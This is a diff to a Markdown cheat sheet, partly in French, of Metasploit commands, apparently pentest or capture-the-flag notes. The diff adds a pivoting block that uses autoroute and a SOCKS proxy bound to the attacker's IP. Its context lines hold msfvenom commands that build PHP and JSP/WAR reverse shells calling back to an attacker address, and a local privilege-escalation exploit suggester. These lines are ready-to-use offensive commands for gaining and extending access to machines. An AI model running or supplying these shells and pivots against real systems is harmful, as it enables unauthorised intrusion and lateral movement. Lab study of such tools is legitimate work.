@@ -11,8 +11,25 @@
  set RPORT PORT # ou 80
 ```
 
+###### Pivoting
+
+- [Pivoting](https://docs.metasploit.com/docs/using-metasploit/intermediate/pivoting-in-metasploit.html)
+
 ```bash
-#list payloads 
+use post/multi/manage/autoroute
+set SESSION <SessionNumber>
+run
+use auxiliary/server/socks_proxy
+set SRVHOST <AttackIp>
+run
+# find and run exploit
+
+# to see web interface
+# select Network Settings to open the connection settings. Select SOCKS Host and provide IP address of the Kali machine and port as 1080.
+```
+
+```bash
+#list payloads
 msfvenom  --list payloads
 
 # utilisation de msfvenom pour generer un reverse shell php
@@ -23,7 +40,6 @@ msfvenom -p php/reverse_php LHOST=OUR_IP LPORT=OUR_PORT -f raw > reverse.php
 # privilege escalation audit and suggestion
 use post/multi/recon/local_exploit_suggester
 ```
-
 
 ```bash
 # run in background
@@ -42,10 +58,9 @@ apt update; apt install metasploit-framework
 ```
 
 ```bash
-# java reverse tcp payload 
-msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.10 LPORT=9999 -f war -o rshell.war 
+# java reverse tcp payload
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.10 LPORT=9999 -f war -o rshell.war
 ```
-
 
 **Ressources**
 
